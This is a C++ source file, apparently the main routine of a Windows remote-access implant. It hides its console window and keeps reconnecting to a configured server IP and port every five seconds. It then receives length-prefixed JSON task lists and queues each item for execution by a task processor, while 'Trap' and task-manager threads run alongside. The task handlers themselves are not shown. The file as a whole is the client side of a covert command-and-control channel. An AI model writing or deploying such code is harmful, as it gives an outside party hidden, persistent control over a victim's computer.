#include "function.h"


int main(){
    HWND hwnd = GetConsoleWindow();       // Get handle to the console window
    ShowWindow(hwnd, SW_HIDE);           // Hide the console window

    while (TRUE) {

        sockctr = UL_Socket::ConnectToServer(IP, PORT);
        if (sockctr == INVALID_SOCKET) {
            cout << "[Main][Failed] Try 5 sec ..." << endl;
            closesocket(sockctr);
            WSACleanup();
            Sleep(5000);
            continue;
        }
        if (!UL_Socket::SocketInitialization(sockctr, 4966)) {
            closesocket(sockctr);
            WSACleanup();
            continue;
        }
        // 16 byte recv
        if (!UL_SocketTools::SettingMainVariables(sockctr)) {
            LOG(sockctr, "[Main][Failed] Failed to Recv 16 byte (variable initialization)");
            closesocket(sockctr);
            WSACleanup();
            continue;
        }
        // thread Trap

        HANDLE hThreadtrap = CreateThread(nullptr, 0, UL_SocketTools::Trap, 0, 0, nullptr);
        if (!RunOnce) HANDLE hTaskManager = CreateThread(nullptr, 0, UL_SocketTools::TaskManager, 0, 0, nullptr);

        while (TRUE) {
            RunOnce = TRUE;
            if (!UL_Socket::IsSocketAlive(sockctr)) {
                cout << "[Main] IsSocketAlive" << endl;

                TerminateThread(hThreadtrap, 0);
                continue;
            }
            vector<char> recv4Byte;
            //cout << "pass 1" << endl;
            if (!UL_Socket::recvWithSize(sockctr, recv4Byte, 4)) {
                // LOG ()
                cout << "[Main][Failed] 4 byte ";

                TerminateThread(hThreadtrap, 0);
                break;
            }
            //cout << "pass 2" << endl;
            INT SIZEOFNEXTRECV = (UL_SocketTools::extractAndRemoveFlag(recv4Byte, 4));


            vector<char>* BufferForTaskList = new vector<char>(SIZEOFNEXTRECV);
            if (!UL_Socket::recvWithSize(sockctr, *BufferForTaskList, SIZEOFNEXTRECV)) {
                // LOG ()
                cout << "[Main][Failed] " << SIZEOFNEXTRECV << " byte ";

                TerminateThread(hThreadtrap, 0);
                break;
            }

            cout << "Buffer content: ";
            cout.write(BufferForTaskList->data(), BufferForTaskList->size());
            cout << endl;

            json result = UL_JsonTools::parseBufferToJson(BufferForTaskList);
            for (auto& item : result) {
                std::string* s = new std::string(item.dump());
                Task t;
                t.func = UL_SocketTools::TaskProcessor;
                t.json_item = s;
                taskQueue.push(t);
            }



            //WaitForSingleObject(hThread, INFINITE);
        }
        closesocket(sockctr);
        WSACleanup();
    }

}
